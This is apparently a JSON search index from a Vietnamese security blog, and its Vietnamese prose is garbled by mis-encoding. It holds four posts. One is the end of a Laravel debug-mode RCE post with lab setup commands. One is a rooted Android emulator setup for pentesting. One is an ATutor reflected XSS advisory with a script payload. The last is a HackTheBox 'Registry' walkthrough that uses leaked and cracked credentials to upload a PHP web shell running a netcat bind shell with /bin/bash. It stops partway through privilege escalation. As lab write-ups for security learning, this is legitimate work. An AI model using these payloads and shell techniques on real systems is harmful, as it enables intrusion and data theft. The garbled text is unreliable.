nghiá»‡m thÃ¬ Ä‘á»£i mÃ¬nh build xong Docker rá»“i cháº¡y nhÃ©, táº¡m thá»i dÃ¹ng táº¡m cÃ¡i nÃ y Ä‘Ã£ nha\n$ git clone https://github.com/laravel/laravel.git $ cd laravel $ git checkout e849812 $ composer install $ composer require facade/ignition==2.5.1 $ php artisan serve ChÃºng mÃ¬nh cÃ³ viáº¿t xong PoC exploit á»Ÿ Ä‘Ã¢y, hi vá»ng cÃ³ Ã­ch cho má»i ngÆ°á»i ;)\nGithub: https://github.com/khanhnv-2091/laravel-8.4.2-rce\nCáº£m Æ¡n anh @vigov5 vÃ  @com0tf3 Ä‘Ã£ há»— trá»£ nghiÃªn cá»©u CVE nÃ y.\nTham kháº£o  https://www.ambionics.io/blog/laravel-debug-rce   BÃ i chÆ°a háº¿t á»Ÿ Ä‘Ã¢y nhá»›, cÃ²n pháº§n 2 :D\n ","permalink":"https://minhtuanact.github.io/content/post/laravel-v8.4.2-debug-mode-remote-code-execution/","summary":"Táº£n máº¡n \u0026ldquo;Háº±ng nÄƒm cá»© vÃ o cuá»‘i Ä‘Ã´ng, lÃ¡ ngoÃ i Ä‘Æ°á»ng rá»¥ng nhiá»u vÃ  trÃªn khÃ´ng cÃ³ nhá»¯ng Ä‘Ã¡m mÃ¢y bÃ ng báº¡c, lÃ²ng tÃ´i láº¡i nao ná»©c nhá»¯ng ká»· niá»‡m hoang mang.\nTÃ´i khÃ´ng thá»ƒ nÃ o quÃªn Ä‘Æ°á»£c nhá»¯ng cáº£m giÃ¡c trong sÃ¡ng áº¥y náº£y ná»Ÿ trong lÃ²ng tÃ´i nhÆ° máº¥y cÃ nh hoa tÆ°Æ¡i má»‰m cÆ°á»i giá»¯a báº§u trá»i quang Ä‘Ã£ng.\nNhá»¯ng Ã½ tÆ°á»Ÿng áº¥y tÃ´i chÆ°a láº§n nÃ o ghi lÃªn giáº¥y, vÃ¬ há»“i áº¥y tÃ´i khÃ´ng biáº¿t ghi vÃ  ngÃ y nay tÃ´i khÃ´ng nhá»› háº¿t.","title":"Laravel \u003c= v8.4.2 debug mode: Remote code execution"},{"content":"Tá»± sá»± má»™t chÃºt Cuá»‘i tuáº§n hÆ¡i ráº£nh láº¡i sáº¯p rá»§ báº¡n gÃ¡i Ä‘i Äƒn, nÃªn mÃ¬nh cÃ³ download 1 app android cá»§a 1 chuá»—i cá»­a hÃ ng cÃ³ tiáº¿ng á»Ÿ HÃ  Ná»™i vá» Ä‘á»ƒ xem cÃ³ khuyáº¿n máº¡i gÃ¬ khÃ´ng. Vá»›i má»™t pentester thÃ¬ khi mÃ¬nh dÃ¹ng cÃ¡i app nÃ y mÃ¬nh Ä‘Ã£ ngá»­i tháº¥y mÃ¹i sai sai gÃ¬ rá»“i. Khá»• ná»—i 1 Ä‘iá»u lÃ  mÃ´i trÆ°á»ng láº¡i config háº¿t trÃªn mÃ¡y cÃ´ng ty rá»“i, mÃ¡y á»Ÿ nhÃ  mÃ¬nh trÆ°á»›c cÃ³ cÃ i mÃ  gá»¡ Ä‘i máº¥t rá»“i. Cháº³ng láº½ láº¡i lÃªn cÃ´ng ty ngá»“i test ğŸ˜¤.\nVá»›i báº£n tÃ­nh hÆ¡i lÆ°á»i cá»§a mÃ¬nh thÃ¬ cháº¯c cháº¯n mÃ¬nh sáº½ khÃ´ng lÃªn cÃ´ng ty mÃ  setup mÃ´i trÆ°á»ng á»Ÿ nhÃ  luÃ´n Ä‘á»ƒ test cho tiá»‡n, sau nÃ y cÃ²n pháº£i test cÃ¡i khÃ¡c ná»¯a chá»© ğŸ˜†\nNgá»“i nguyÃªn cáº£ má»™t buá»•i sÃ¡ng thÃ¬ sau khi cÃ i Ä‘á»§ thá»ƒ loáº¡i nhÆ° genymotion, nox, bluestack, koplayer Ä‘á»u khÃ´ng há»— trá»£ Hyper-V, toÃ n yÃªu cáº§u mÃ¬nh táº¯t Hyper-V Ä‘i, trong khi Hyper-V xá»‹n nhÆ° tháº¿, ngon nhÆ° tháº¿ mÃ  nÃ³ khÃ´ng support.\nKhÃ´ng Ä‘áº§u hÃ ng trÆ°á»›c sá»‘ pháº­n, mÃ¬nh Ä‘Ã£ tÃ¬m cÃ¡c emulator khÃ¡c support Hyper-V. Sau má»™t há»“i tÃ¬m kiáº¿m thÃ¬ tháº¥y BlueStack cÃ³ support Hyper-V nhÆ°ng Ä‘ang á»Ÿ báº£n beta, mÃ¬nh cÃ i Ä‘áº·t 1 há»“i mÃ  nÃ³ náº·ng quÃ¡ cháº³ng lÃªn nÃªn cho nÃ³ ra Ä‘i tÃ¬m Ä‘Æ°á»ng cá»©u nÆ°á»›c luÃ´n.\nTiáº¿p tá»¥c khÃ´ng bá» cuá»™c, mÃ¬nh Ä‘Ã£ tÃ¬m tháº¥y chÃ¢n Ã¡i cá»§a cuá»™c Ä‘á»i mÃ¬nh náº±m á»Ÿ Ä‘Ã¢y Hyper-V Android emulator support  ğŸ˜š\nTuy nhiÃªn, cÃ i Ä‘áº·t Emulator Android thÃ¬ cáº§n pháº£i cÃ i cáº£ Android Studio, mÃ  á»• cá»©ng cá»§a mÃ¬nh cÃ³ háº¡n nÃªn mÃ¬nh Ä‘Ã£ tÃ¬m cÃ¡ch cÃ i Ä‘áº·t má»—i Emulator thÃ´i mÃ  khÃ´ng cáº§n cÃ i Android Studio.\nChÃ o má»«ng anh em Ä‘áº¿n pháº§n tiáº¿p theo ğŸ˜\nCÃ i Ä‘áº·t Emulator khÃ´ng cáº§n cÃ i Android Studio Sau Ä‘Ã¢y lÃ  step-by-step Ä‘á»ƒ cho cÃ¡c báº¡n cÃ³ thá»ƒ cÃ i Ä‘Æ°á»£c Android Emulator mÃ  khÃ´ng cáº§n cÃ i Android Studio ğŸ¤—\n  Download vÃ  cÃ i Ä‘áº·t JDK, cÃ¡c báº¡n cÃ³ thá»ƒ cÃ i JDK báº£n nÃ o cÅ©ng Ä‘Æ°á»£c, tá»« 1.8 Ä‘áº¿n báº£n 15 má»›i nháº¥t hiá»‡n nay luÃ´n\n  CÃ i biáº¿n mÃ´i trÆ°á»ng JAVA_HOME\nMá»Ÿ Command Prompt (Win + R, gÃµ cmd vÃ  nháº¥n Enter hoáº·c báº¥t kÃ¬ cÃ¡ch nÃ o mÃ  báº¡n cÃ³ thá»ƒ má»Ÿ cmd.exe ğŸ˜†)\nsetx JAVA_HOME \u0026#34;C:\\Program Files\\Java\\jdk-15.0.1\u0026#34; Hoáº·c cÃ³ thá»ƒ sá»­ dá»¥ng GUI (Start -\u0026gt; Edit the system environment variables -\u0026gt; Environment variables\u0026hellip; -\u0026gt; New\u0026hellip;)\n  á» Ä‘Ã¢y mÃ¬nh Ä‘ang cÃ i Android Emulator cho Hyper-V nÃªn cÃ¡c báº¡n cáº§n pháº£i báº­t Hyper-V trÃªn mÃ¡y mÃ¬nh lÃªn nhÃ© ;)\n  Download Command line tools báº£n cho Windows\n  Táº¡o má»™t thÆ° má»¥c Android á»Ÿ má»™t nÆ¡i mÃ  cÃ¡c báº¡n thÃ­ch (á» Ä‘Ã¢y mÃ¬nh cho vÃ o á»• E cho rá»™ng rÃ£i)\nGiáº£i nÃ©n file vá»«a táº£i vÃ o thÆ° má»¥c vá»«a táº¡o Táº¡i Ä‘Ã¢y cáº§n chÃº Ã½ má»™t chÃºt, á»Ÿ Ä‘Ã¢y cÃ¡c báº¡n cáº§n pháº£i sá»­ dá»¥ng bÃ­ thuáº­t nÃ y (vÃ¬ cÃ¡i lá»—i nÃ y mÃ  mÃ¬nh loay hoay háº¿t gáº§n buá»•i sÃ¡ng)\nMove toÃ n bá»™ file trong thÆ° má»¥c cmdline-tools sang thÆ° má»¥c latest náº±m trong thÆ° má»¥c cmdline-tools\n  ChÃºng ta sáº½ Ä‘Æ°á»£c má»™t cÃ¢y thÆ° má»¥c nhÆ° sau\ncmdline-tools â””â”€â”€ latest â”œâ”€â”€ bin â”œâ”€â”€ lib â”œâ”€â”€ NOTICE.txt â””â”€â”€ source.properties   CÃ i Ä‘áº·t biáº¿n mÃ´i trÆ°á»ng ANDROID_HOME thÃ nh:\nsetx ANDROID_HOME E:\\Android   Táº¡o new entry cho Path trong biáº¿n mÃ´i trÆ°á»ng:\nsetx path \u0026#34;%PATH%;%ANDROID_HOME%\\cmdline-tools\\latest\\bin\u0026#34; /m Hoáº·c cÃ³ thá»ƒ sá»­ dá»¥ng GUI náº¿u cÃ¡c báº¡n thÃ­ch.\n   LÆ°u Ã½: cáº§n pháº£i táº¯t CMD Ä‘i rá»“i báº­t láº¡i Ä‘á»ƒ Ã¡p dá»¥ng cÃ¡c thay Ä‘á»•i.\n  Kiá»ƒm tra sdkmanager Ä‘Ã£ hoáº¡t Ä‘á»™ng chÆ°a báº±ng cÃ¡ch gÃµ lá»‡nh\nsdkmanager --list Táº¡i Ä‘Ã¢y cÃ³ thá»ƒ xem danh sÃ¡ch cÃ³ sáºµn cá»§a nhá»¯ng gÃ³i mÃ  mÃ¬nh cÃ³ thá»ƒ táº£i vá». Náº¿u bá»‹ lá»—i á»Ÿ bÆ°á»›c nÃ y thÃ¬ kiá»ƒm tra cÃ i Ä‘áº·t biáº¿n mÃ´i trÆ°á»ng hoáº·c cÃ³ thá»ƒ post vÃ o bÃ i nÃ y cá»§a mÃ¬nh Ä‘á»ƒ mÃ¬nh kiá»ƒm tra giÃºp ;)\n  Tiáº¿p theo cáº§n cÃ i Ä‘áº·t cÃ¡c gÃ³i nhÆ° platform-tools, platform; android-*, emulator vÃ  system-images; android-*; google_apis; x86_64, trong Ä‘Ã³ * cÃ³ nghÄ©a lÃ  phiÃªn báº£n\nsdkmanager \u0026#34;platforms;android-25\u0026#34; \u0026#34;system-images;android-25;google_apis;x86_64\u0026#34; \u0026#34;platform-tools\u0026#34; \u0026#34;emulator\u0026#34;   Tiáº¿p theo chÃºng ta cáº§n cháº¥p nháº­n cÃ¡c Ä‘iá»u khoáº£n, giáº¥y phÃ©p.\nsdkmanager --licenses áº¤n Y liÃªn tá»t lÃ  Ä‘Æ°á»£c nhÃ© cÃ¡c báº¡n ;)\n  Xong bÆ°á»›c trÃªn lÃ  chÃºng ta cÃ³ thá»ƒ táº¡o Ä‘Æ°á»£c má»™t con android áº£o má»›i rá»“i ;)\navdmanager create avd -n google-api-25 -k \u0026quot;system-images;android-25;google_apis;x86_64\u0026quot;   Äá»ƒ xem danh sÃ¡ch thiáº¿t bá»‹, gÃµ lá»‡nh:\navdmanager list avd   Äi tá»›i thÆ° má»¥c emulator náº±m á»Ÿ Android/emulator rá»“i gÃµ lá»‡nh Ä‘á»ƒ khá»Ÿi Ä‘á»™ng mÃ¡y áº£o:\nemulator -avd google-api-25   Má»™t chiáº¿c mÃ¡y Android cá»±c xá»‹n dÃ nh cho báº¡n Ä‘Ã£ khá»Ÿi Ä‘á»™ng lÃªn Ä‘Æ°á»£c rá»“i ;)\nLÆ°u Ã½ CÃ¡c báº¡n hoÃ n toÃ n cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡ch nÃ y Ä‘á»ƒ cÃ i Android Emulator lÃªn Linux hoáº·c MacOS. Miá»…n lÃ  cÃ¡c báº¡n hiá»ƒu cáº¥u trÃºc bÃªn Linux vá»›i MacOS tÆ°Æ¡ng á»©ng vá»›i Windows lÃ  Ä‘Æ°á»£c. Chá»§ yáº¿u lÃ  cÃ i Ä‘áº·t biáº¿n mÃ´i trÆ°á»ng thÃ´i ^^\nMá»™t sá»‘ váº¥n Ä‘á» Báº¡n sáº½ khÃ´ng thá»ƒ sá»­ dá»¥ng keyboard vá»›i mÃ¡y áº£o Ä‘Æ°á»£c, cáº§n Ä‘Æ°á»£c cáº¥u hÃ¬nh láº¡i báº±ng cÃ¡ch\n  Äi tá»›i thÆ° má»¥c .android trong thÆ° má»¥c home cá»§a báº¡n, di chuyá»ƒn tiáº¿p vÃ o avd/google-api-25.avd tÃ¬m Ä‘áº¿n file config.ini vÃ  sá»­a\nhw.keyboard=yes   Má»™t Ä‘iá»u hÆ¡i oÃ¡i oÄƒm ná»¯a lÃ  má»Ÿ adb lÃªn mÃ¬nh lÃ  root rá»“i mÃ  khÃ´ng cÃ³ quyá»n ghi vÃ o\ngeneric_x86_64:/ # whoami root generic_x86_64:/system # touch abc touch: \u0026#39;abc\u0026#39;: Read-only file system Khá»Ÿi Ä‘á»™ng emulator vá»›i quyá»n writable vÃ  disable selinux\nemulator -avd google-api-25 -writable-system -selinux disabled âœ google-api-25.avd adb root adbd is already running as root âœ google-api-25.avd adb disable-verity Failed to open /fstab.ranchu Maybe run adb root? âœ google-api-25.avd adb reboot âœ google-api-25.avd adb root restarting adbd as root âœ google-api-25.avd adb remount remount succeeded âœ google-api-25.avd adb shell LÃºc nÃ y báº¡n cÃ³ thá»ƒ thoáº£i mÃ¡i vá»›i chiáº¿c mÃ¡y áº£o mÃ¬nh vá»«a táº¡o ra rá»“i ğŸ¤§\n  Káº¿t Cáº£m Æ¡n anh @vigov5 Ä‘Ã£ support em trong suá»‘t thá»i gian thá»±c hiá»‡n cÃ i Ä‘áº·t Emulator :D\nTham kháº£o  https://dev.to/koscheyscrag/how-to-install-android-emulator-without-installing-android-studio-3lce https://developer.android.com/studio/#downloads https://developer.android.com/studio/run/emulator https://devblogs.microsoft.com/visualstudio/hyper-v-android-emulator-support/  ","permalink":"https://minhtuanact.github.io/content/post/cai-dat-android-emulator-sao-cho-ngau/","summary":"Tá»± sá»± má»™t chÃºt Cuá»‘i tuáº§n hÆ¡i ráº£nh láº¡i sáº¯p rá»§ báº¡n gÃ¡i Ä‘i Äƒn, nÃªn mÃ¬nh cÃ³ download 1 app android cá»§a 1 chuá»—i cá»­a hÃ ng cÃ³ tiáº¿ng á»Ÿ HÃ  Ná»™i vá» Ä‘á»ƒ xem cÃ³ khuyáº¿n máº¡i gÃ¬ khÃ´ng. Vá»›i má»™t pentester thÃ¬ khi mÃ¬nh dÃ¹ng cÃ¡i app nÃ y mÃ¬nh Ä‘Ã£ ngá»­i tháº¥y mÃ¹i sai sai gÃ¬ rá»“i. Khá»• ná»—i 1 Ä‘iá»u lÃ  mÃ´i trÆ°á»ng láº¡i config háº¿t trÃªn mÃ¡y cÃ´ng ty rá»“i, mÃ¡y á»Ÿ nhÃ  mÃ¬nh trÆ°á»›c cÃ³ cÃ i mÃ  gá»¡ Ä‘i máº¥t rá»“i.","title":"[Pentest Android] CÃ i Ä‘áº·t Android Emulator sao cho ngáº§u :-?"},{"content":"Reflected XSS in ATutor 2.2.4 Software Link: https://atutor.github.io/atutor/downloads.html\nDate: 05-06-2020\nExploit Author: cm0s\nVersion \u0026lt;= 2.2.4\nVulnerability analysis The program displays data without performing data encode. This has resulted in the Reflected XSS error. themes/default/include/header.tmpl.php line \u0026lt;?php global $msg; $msg-\u0026gt;printAll(); $_base_href;?\u0026gt; Exploit Send payload:\nhttp://\u0026lt;target\u0026gt;/browse.php?search=%3Cscript%3Ealert(1)%3C%2fscript%3E ","permalink":"https://minhtuanact.github.io/content/post/reflected-xss-in-atutor-2.2.4/","summary":"Reflected XSS in ATutor 2.2.4 Software Link: https://atutor.github.io/atutor/downloads.html\nDate: 05-06-2020\nExploit Author: cm0s\nVersion \u0026lt;= 2.2.4\nVulnerability analysis The program displays data without performing data encode. This has resulted in the Reflected XSS error. themes/default/include/header.tmpl.php line \u0026lt;?php global $msg; $msg-\u0026gt;printAll(); $_base_href;?\u0026gt; Exploit Send payload:\nhttp://\u0026lt;target\u0026gt;/browse.php?search=%3Cscript%3Ealert(1)%3C%2fscript%3E ","title":"Reflected XSS in ATutor 2.2.4"},{"content":"Táº£ thá»±c VÃ o má»™t ngÃ y Ä‘áº¹p trá»i (Ã  thá»±c ra thÃ¬ cÅ©ng khÃ´ng Ä‘áº¹p láº¯m, trá»i vá»«a mÆ°a vá»«a rÃ©t cháº£ Ä‘i chÆ¡i Ä‘Æ°á»£c Ä‘Ã¢u) thÃ¬ cÃ³ ngÆ°á»i báº¡n mÃ¬nh trong team báº£o chÆ¡i hackthebox vÃ  Ä‘ang cÃ³ lá»—i. ÄÆ°á»£c cÃ¡i mÃ¬nh cÅ©ng nhiá»‡t tÃ¬nh + phÃ¡ hoáº¡i nÃªn vÃ o giÃºp tÃ½ cho vui.\nStart Recon âœ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.20s latency). Not shown: 905 closed ports, 92 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 5.22 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.38 seconds Tháº¥y Ä‘oáº¡n\nssl-cert: Subject: commonName=docker.registry.htb Sá»­a /etc/hosts thÃªm Ä‘oáº¡n\n10.10.10.159 docker.registry.htb registry.htb Sá»­ dá»¥ng gobuster recon thÆ° má»¥c\ngobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l 40 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://docker.registry.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Timeout: 10s =============================================================== 2020/02/10 16:09:49 Starting gobuster =============================================================== /v2 (Status: 301) [Size: 39] Tháº¥y cÃ³ thÆ° má»¥c /v2 bÃ¡o 301 thÃ¬ trang nÃ y cÃ³ gáº¯n basic auth. Thá»­ nháº­p admin:admin vÃ o thÃ¬ Ä‘Æ°á»£c :v. Ä‚n may xÃ­u thÃ´i. Sau khi nháº­p Ä‘Æ°á»£c basic auth thÃ¬ á»Ÿ docker cÃ³ thÆ° má»¥c _catalog Ä‘á»ƒ kiá»ƒm tra cÃ³ image gÃ¬ trong Ä‘áº¥y. Láº¥y cá» User Váº­y lÃ  ta biáº¿t Ä‘Æ°á»£c image tÃªn lÃ  gÃ¬ rá»“i thÃ¬ mÃ¬nh pull docker vá» xem sao.\nNhÆ°ng trong lÃºc mÃ¬nh pull docker vá» thÃ¬ gáº·p lá»—i nÃ y\nminhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image Using default tag: latest Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority HÃ³a ra lÃ  mÃ¬nh chÆ°a cÃ³ certificate. Váº­y thÃ¬ update certificate thá»§ cÃ´ng thÃ´i VÃ o https://docker.registry.htb táº£i file .crt vá» copy file Ä‘áº¥y vÃ o\n/usr/local/share/ca-certificates sudo update-ca-certificates sudo service docker restart minhtuan@kali:~$ sudo docker login https://docker.registry.htb Username: admin Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded ThÃ nh cÃ´ng, lÃºc nÃ y ta cÃ³ thá»ƒ pull docker vá» vÃ  sá»­ dá»¥ng bÃ¬nh thÆ°á»ng rá»“i.\nâœ ~ docker pull docker.registry.htb/bolt-image Using default tag: latest latest: Pulling from bolt-image Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b Status: Image is up to date for docker.registry.htb/bolt-image:latest docker.registry.htb/bolt-image:latest Pull vá» xong rá»“i thÃ¬ chui vÃ o thÃ´i\nâœ ~ docker run --rm -it docker.registry.htb/bolt-image:latest root@9818304f783b:/# Kinh nghiá»‡m cá»§a mÃ¬nh lÃ  cá»© táº­p trung vÃ o nhá»¯ng folder nÃ o nÃ³ cá»±c ká»³ nháº¡y cáº£m nhÆ° ssh, rá»“i máº¥y thÆ° má»¥c user, /var/www/html xem cÃ³ gÃ¬ khÃ´ng. Lá»¥c mÃ£i thÃ¬ trong thÆ° má»¥c /root/.ssh cÃ³ file private key ssh. Má»«ng huÃ½nh rá»“i sá»­ dá»¥ng ssh2john.py vÃ  john brute force láº¥y pass private key nhÆ°ng mÃ  k Ä‘Æ°á»£c. NÃªn mÃ¬nh quay láº¡i docker xem bÃªn trong cÃ²n gÃ¬ ná»¯a khÃ´ng. Sau má»™t há»“i tÃ¬m kiáº¿m lÃ¹ng sá»¥c thÃ¬ mÃ¬nh tháº¥y cÃ³ 1 file nÃ y á»Ÿ Ä‘Ã¢y.\nroot@9818304f783b:/etc/profile.d# cat 01-ssh.sh #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \u0026#34;Enter passphrase for /root/.ssh/id_rsa:\u0026#34; send \u0026#34;GkOcz221Ftb3ugog\\n\u0026#34;; expect \u0026#34;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\u0026#34; interact Váº­y Ä‘Ã¢y lÃ  Ä‘oáº¡n chÆ°Æ¡ng trÃ¬nh táº¡o khÃ³a private key. Máº­t kháº©u file id_rsa kia lÃ  GkOcz221Ftb3ugog. Viá»‡c cÃ²n láº¡i lÃ  mÃ¬nh ssh vÃ o machine thÃ´i.\nâœ registry ssh -i id_rsa root@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: root@10.10.10.159\u0026#39;s password: K Ä‘Æ°á»£c. CÆ¡ mÃ  mÃ¬nh hÆ¡i ngÃ¢y thÆ¡, ssh vÃ o root thÃ¬ bÃ i nÃ y Ä‘Ã£ dá»… quÃ¡ =)). Xong mÃ¬nh nhÃ¬n láº¡i cÃ¡i tÃªn image docker lÃ  bolt-image. Thá»­ sá»­ dá»¥ng user ssh lÃ  bolt xem sao.\nâœ registry ssh -i id_rsa bolt@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Feb 10 09:35:17 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 5.7% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 32% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 0% IP address for docker0: 172.17.0.1 Processes: 173 Last login: Mon Feb 10 09:06:21 2020 from 10.10.16.7 bolt@bolt:~$ user.txt cat user.txt vÃ  submit lÃªn thÃ´i :v\nLáº¥y cá» Root MÃ¬nh sá»­ dá»¥ng private key Ä‘á»ƒ Ä‘Äƒng nháº­p vÃ o ssh cá»§a bolt nÃªn mÃ¬nh chÆ°a thá»ƒ sá»­ dá»¥ng sudo right Ä‘á»ƒ leo thang Ä‘áº·c quyá»n Ä‘Æ°á»£c vÃ¬ khi gÃµ sudo -l há»‡ thá»‘ng sáº½ yÃªu cáº§u nháº­p máº­t kháº©u cá»§a bolt. MÃ¬nh Ä‘Ã£ sá»­ dá»¥ng LinEnum.sh Ä‘á»ƒ khai thÃ¡c á»Ÿ user bolt nÃ y nhÆ°ng chÆ°a thu Ä‘Æ°á»£c káº¿t quáº£ gÃ¬. Thá»­ Ä‘á»§ loáº¡i exploit mÃ  k lÃªn Ä‘Æ°á»£c root. Äiá»u khiáº¿n cho mÃ¬nh táº­p trung tiáº¿p lÃ  vÃ o pháº§n web. MÃ¬nh tÃ¬m tháº¥y Ä‘Æ°á»£c trong thÆ° má»¥c web cÃ³ thÆ° má»¥c /bolt thÃ¬ mÃ¬nh thá»­ vÃ o xem sao. Trang nÃ y Ä‘Æ°á»£c táº¡o bá»Ÿi Bolt CMS, lÃ  1 opensource. MÃ¬nh Ä‘á»c trÃªn doc thÃ¬ tháº¥y chá»— login https://docs.bolt.cm/3.7/manual/login lÃ  /login nhÆ°ng mÃ  thá»­ thÃ¬ láº¡i báº¯n ra lá»—i 404. Xong rá»“i mÃ¬nh thá»­ láº¡i lÃ  http://registry.htb/bolt/bolt thÃ¬ láº¡i vÃ o Ä‘Æ°á»£c trang login (nani, cháº£ hiá»ƒu kiá»ƒu gÃ¬). CÃ´ng cuá»™c tiáº¿p theo thÃ¬ tÃ¬m kiáº¿m account admin Ä‘Äƒng nháº­p vÃ o Ä‘Ã¢y thÃ´i. Lá»¥c tiáº¿p trong folder /var/www/html/bolt thÃ¬ cÃ³ 1 file db\nbolt@bolt:/var/www/html/bolt/app/database$ ls bolt.db bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db bolt.db: SQLite 3.x database, last written using SQLite version 3022000 Check file thÃ¬ Ä‘Ã¢y lÃ  1 file db SQLite 3. Tiáº¿c lÃ  trÃªn machine láº¡i k cÃ³ sqlite3 nÃªn mÃ¬nh copy file nÃ y vá» mÃ¡y Ä‘á»ƒ kiá»ƒm tra. Sá»­ dá»¥ng scp Ä‘á»ƒ copy file bolt.db vá» mÃ¡y mÃ¬nh\nâœ registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db . Sau khi Ä‘Ã£ copy xong file thÃ¬ mÃ¬nh chui vÃ o xem trong Ä‘Ã³ cÃ³ gÃ¬, mÃ¬nh tÃ¬m tháº¥y tÃ i khoáº£n admin á»Ÿ trong báº£ng bolt_users\nâœ registry sqlite3 bolt.db SQLite version 3.31.0 2019-12-29 00:52:41 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .table bolt_authtoken bolt_field_value bolt_pages bolt_users bolt_blocks bolt_homepage bolt_relations bolt_cron bolt_log_change bolt_showcases bolt_entries bolt_log_system bolt_taxonomy sqlite\u0026gt; select * from bolt_users ...\u0026gt; ; 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-02-09 23:27:11|10.10.15.117|Admin|[\u0026#34;themes://basic.php\u0026#34;,\u0026#34;themes://rev.php\u0026#34;,\u0026#34;themes://base-2018/meh.twig\u0026#34;,\u0026#34;themes://meh.twig\u0026#34;,\u0026#34;themes://shell.php\u0026#34;]|1||||0||[\u0026#34;root\u0026#34;,\u0026#34;everyone\u0026#34;] sqlite\u0026gt; Sá»­ dá»¥ng john Ä‘á»ƒ crack passwd admin ra Ä‘Æ°á»£c passwd lÃ  strawberry, Ä‘Äƒng nháº­p vÃ o http://registry.htb/bolt/bolt á» Ä‘Ã¢y cÃ³ 1 trÃ¬nh upload file, ta thá»­ upload file shell lÃªn Ä‘Ã¢y nhÆ°ng mÃ  nÃ³ k cho upload file php lÃªn. Ta sá»­a 1 chÃºt config á»Ÿ Ä‘Ã¢y Ä‘á»ƒ server cho phÃ©p upload file php Sau Ä‘áº¥y ta lÆ°u láº¡i rá»“i chuyá»ƒn sang chá»©c nÄƒng upload Ä‘áº©y shell lÃªn. Ban Ä‘áº§u mÃ¬nh sá»­ dá»¥ng https://github.com/flozz/p0wny-shell nhÆ°ng mÃ  mÃ¬nh k thá»ƒ reverse shell láº¡i mÃ¡y mÃ¬nh Ä‘Æ°á»£c, dÆ°á»ng nhÆ° lÃ  á»Ÿ Ä‘Ã¢y cáº¥u hÃ¬nh firewall cháº·n káº¿t ná»‘i ra ngoÃ i. Viáº¿t Ä‘á»§ thá»ƒ loáº¡i shell php upload lÃªn nhÆ°ng mÃ  k Ä‘Æ°á»£c, nÃªn mÃ¬nh nghÄ© Ä‘áº¿n lÃ  sá»­ dá»¥ng mÃ¡y mÃ¬nh reverse shell lÃªn mÃ¡y chá»§. Sá»­ dá»¥ng file shell.php \u0026lt;?php system(\u0026#34;nc.traditional -lvp 4444 -e /bin/bash\u0026#34;); \nUpload lÃªn rá»“i bÃªn mÃ¡y mÃ¬nh sá»­ dá»¥ng lá»‡nh\nâœ registry nc -nv 10.10.10.159 4444 (UNKNOWN) [10.10.10.159] 4444 (?) open Upgrade shell\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Äáº¿n Ä‘Ã¢y rá»“i láº¡i tiáº¿p tá»¥c sá»­ dá»¥ng LinEnum.sh Ä‘á»ƒ kiá»ƒm tra xem cÃ³ gÃ¬ khÃ´ng thÃ¬ mÃ¬nh tháº¥y cÃ¡i nÃ y\n[+] We can sudo without supplying a password! Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) 